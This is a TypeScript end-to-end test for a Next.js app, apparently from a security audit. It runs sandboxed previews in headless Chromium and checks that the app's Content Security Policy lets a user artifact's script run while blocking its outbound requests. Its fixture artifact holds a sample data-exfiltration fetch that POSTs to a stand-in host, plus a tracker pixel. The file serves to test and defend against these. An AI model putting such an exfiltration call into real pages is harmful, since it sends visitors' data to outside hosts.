import test from "node:test";
import assert from "node:assert/strict";
import { existsSync, readdirSync } from "node:fs";
import http from "node:http";
import type { AddressInfo } from "node:net";
import path from "node:path";
import { build } from "esbuild";
import { NextRequest } from "next/server";
import * as React from "react";
import { renderToString } from "react-dom/server";
import { SandboxFrame } from "@/components/canvas/sandbox-frame";
import { middleware } from "@/middleware";
import { GET as shellRoute } from "@/app/sandbox/v1/[profile]/route";

/**
 * AUDIT X-01, END TO END: DOES AN ARTIFACT'S SCRIPT RUN UNDER THE APP'S POLICY?
 *
 * tests/sandbox-origin.test.ts checks each link of the chain on its own. This
 * one puts them together in a real Chromium, the way production does:
 *
 *   - every request goes through the real middleware, so the page gets the
 *     real enforcing nonce policy, and the shell gets whatever the middleware
 *     decides for it (if it ever adds the app policy again, both headers are
 *     sent and both apply — exactly the production failure);
 *   - the shell is the real route handler's response;
 *   - the page mounts the real <SandboxFrame>, bundled from source — twice
 *     client-rendered (one per profile) and once server-rendered then
 *     hydrated late, because a frame in the server HTML starts loading before
 *     React is listening, and a shell that says "ready" to nobody never renders.
 *
 * And it carries its own control: a plain srcdoc frame on the same page, which
 * must stay silent. If the control ever runs, the harness has stopped
 * reproducing the bug and the rest of this file proves nothing.
 *
 * Needs a Chromium: PLAYWRIGHT_BROWSERS_PATH's (the test container's), or
 * Chrome on a Mac. Skips without one rather than passing.
 */

function chromiumExecutable(): string | undefined {
  const root = process.env.PLAYWRIGHT_BROWSERS_PATH;
  if (root && existsSync(root)) {
    for (const entry of readdirSync(root)) {
      if (!entry.startsWith("chromium-")) continue;
      for (const sub of ["chrome-linux/chrome", "chrome-linux64/chrome"]) {
        const candidate = path.join(root, entry, sub);
        if (existsSync(candidate)) return candidate;
      }
    }
  }
  const mac = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
  return existsSync(mac) ? mac : undefined;
}

const EXECUTABLE = chromiumExecutable();
const NO_BROWSER = EXECUTABLE ? false : "no Chromium is installed on this machine";

/** Artifact code that proves it ran, and reports what the egress policy refused. */
const ARTIFACT = `<!doctype html><html><head><meta charset="utf-8"></head><body>
<p>preview</p>
<img src="https://tracker.example.invalid/pixel.gif" alt="">
<script>
  document.addEventListener("securitypolicyviolation", function (e) {
    console.log("violation " + e.effectiveDirective + " " + e.blockedURI);
  });
  console.log("artifact script ran");
  fetch("https://egress.example.invalid/collect", { method: "POST", body: "typed" }).catch(function () {});
</script>
</body></html>`;

const HARNESS_ENTRY = `
import * as React from "react";
import { createRoot, hydrateRoot } from "react-dom/client";
import { SandboxFrame } from "@/components/canvas/sandbox-frame";
import { SandboxProfileProvider } from "@/components/canvas/sandbox-document-frame";

const results = (window.results = {
  private: { status: [], console: [] },
  public: { status: [], console: [] },
  ssr: { status: [], console: [] },
  control: [],
});
const ARTIFACT = ${JSON.stringify(ARTIFACT)};

function Frame({ name }) {
  return React.createElement(SandboxFrame, {
    type: "HTML",
    content: ARTIFACT,
    onStatus: (s) => results[name].status.push(s),
    onConsole: (e) => results[name].console.push(e.text),
  });
}

hydrateRoot(document.getElementById("ssr"), React.createElement(Frame, { name: "ssr" }));
createRoot(document.getElementById("private")).render(React.createElement(Frame, { name: "private" }));
createRoot(document.getElementById("public")).render(
  React.createElement(SandboxProfileProvider, { profile: "public" }, React.createElement(Frame, { name: "public" }))
);

// The control: the old way. It inherits this page's nonce policy.
window.addEventListener("message", (e) => {
  if (e.data && e.data.type === "control-ran") results.control.push("ran");
});
const control = document.createElement("iframe");
control.setAttribute("sandbox", "allow-scripts");
control.srcdoc = "<script>parent.postMessage({ type: 'control-ran' }, '*')</" + "script>";
document.body.appendChild(control);
`;

async function bundleHarness(): Promise<string> {
  const out = await build({
    stdin: { contents: HARNESS_ENTRY, resolveDir: path.resolve(new URL("..", import.meta.url).pathname), loader: "tsx" },
    bundle: true,
    write: false,
    format: "iife",
    platform: "browser",
    jsx: "automatic",
    // What Next inlines into a client bundle: NEXT_PUBLIC_* at build time.
    // Unset here, so previews load the shell from the page's own origin.
    define: { "process.env.NODE_ENV": '"production"', "process.env.NEXT_PUBLIC_SANDBOX_ORIGIN": "undefined" },
    logLevel: "silent",
  });
  return out.outputFiles[0].text;
}

/** The same frame, as the server renders it into a page before hydration. */
const SSR_FRAME = renderToString(React.createElement(SandboxFrame, { type: "HTML", content: ARTIFACT }));

/** Long enough for a shell in the server HTML to load and speak before React exists. */
const HYDRATION_DELAY_MS = 1500;

async function startServer(bundle: string): Promise<{ origin: string; close: () => Promise<void> }> {
  const server = http.createServer(async (req, res) => {
    const url = `http://${req.headers.host}${req.url}`;
    const decided = middleware(new NextRequest(url, { headers: { host: req.headers.host ?? "" } }));
    if (decided.status === 404) {
      res.writeHead(404).end();
      return;
    }
    const policies: string[] = [];
    const appPolicy = decided.headers.get("content-security-policy");
    if (appPolicy) policies.push(appPolicy);
    const nonce = decided.headers.get("x-middleware-request-x-nonce") ?? "";
    const pathname = new URL(url).pathname;

    if (pathname === "/") {
      if (policies.length) res.setHeader("Content-Security-Policy", policies);
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(
        `<!doctype html><html><body><div id="ssr" style="height:120px">${SSR_FRAME}</div>` +
          `<div id="private" style="height:120px"></div><div id="public" style="height:120px"></div>` +
          `<script nonce="${nonce}" src="/harness.js"></script></body></html>`,
      );
      return;
    }
    if (pathname === "/harness.js") {
      await new Promise((resolve) => setTimeout(resolve, HYDRATION_DELAY_MS));
      res.writeHead(200, { "Content-Type": "text/javascript; charset=utf-8" });
      res.end(bundle);
      return;
    }
    const shell = /^\/sandbox\/v1\/([^/]+)$/.exec(pathname);
    if (shell) {
      const routed = await shellRoute(new Request(url), { params: Promise.resolve({ profile: shell[1] }) });
      const own = routed.headers.get("content-security-policy");
      if (own) policies.push(own);
      if (policies.length) res.setHeader("Content-Security-Policy", policies);
      res.writeHead(routed.status, { "Content-Type": routed.headers.get("content-type") ?? "text/plain" });
      res.end(await routed.text());
      return;
    }
    res.writeHead(404).end();
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const { port } = server.address() as AddressInfo;
  return {
    origin: `http://127.0.0.1:${port}`,
    close: () => new Promise<void>((resolve) => server.close(() => resolve())),
  };
}

interface Results {
  private: { status: string[]; console: string[] };
  public: { status: string[]; console: string[] };
  ssr: { status: string[]; console: string[] };
  control: string[];
}

test("an artifact's scripts run inside the app's enforcing policy, and its egress is refused", { skip: NO_BROWSER }, async () => {
  // Point the middleware and route at this server's origin, as NEXT_PUBLIC_APP_URL would.
  const bundle = await bundleHarness();
  const server = await startServer(bundle);
  const previous = { app: process.env.NEXT_PUBLIC_APP_URL, sandbox: process.env.NEXT_PUBLIC_SANDBOX_ORIGIN };
  process.env.NEXT_PUBLIC_APP_URL = server.origin;
  delete process.env.NEXT_PUBLIC_SANDBOX_ORIGIN;

  const { chromium } = await import("playwright");
  const browser = await chromium.launch({ executablePath: EXECUTABLE as string, headless: true });
  try {
    const page = await browser.newPage();
    await page.goto(`${server.origin}/`);
    await page.waitForFunction(
      () => {
        const r = (window as unknown as { results?: Results }).results;
        return !!r && r.private.status.includes("done") && r.public.status.includes("done") && r.ssr.status.includes("done");
      },
      undefined,
      { timeout: 15_000 },
    );
    // Give the control and the late violation reports the same chance to arrive.
    await page.waitForTimeout(750);
    const results = (await page.evaluate(() => (window as unknown as { results: Results }).results)) as Results;

    assert.deepEqual(results.control, [], "the srcdoc control ran, so this page is not enforcing the app policy — the harness is broken");

    for (const profile of ["private", "public", "ssr"] as const) {
      const { status, console: lines } = results[profile];
      assert.ok(!status.includes("error"), `${profile}: the preview reported an error: ${JSON.stringify(results[profile])}`);
      assert.ok(lines.includes("artifact script ran"), `${profile}: the artifact's inline script did not run`);
      // Egress: nothing a visitor typed can be POSTed to a host the author runs.
      assert.ok(
        lines.some((l) => l.startsWith("violation connect-src https://egress.example.invalid")),
        `${profile}: the fetch to an arbitrary host was not refused: ${JSON.stringify(lines)}`,
      );
    }
    // Images: any https host in your own previews; a public share refuses a tracker.
    assert.ok(
      results.public.console.some((l) => l.startsWith("violation img-src https://tracker.example.invalid")),
      `public: an arbitrary image host was allowed: ${JSON.stringify(results.public.console)}`,
    );
    assert.ok(
      !results.private.console.some((l) => l.startsWith("violation img-src")),
      `private: images from the web were refused: ${JSON.stringify(results.private.console)}`,
    );
  } finally {
    await browser.close();
    await server.close();
    if (previous.app === undefined) delete process.env.NEXT_PUBLIC_APP_URL;
    else process.env.NEXT_PUBLIC_APP_URL = previous.app;
    if (previous.sandbox !== undefined) process.env.NEXT_PUBLIC_SANDBOX_ORIGIN = previous.sandbox;
  }
});
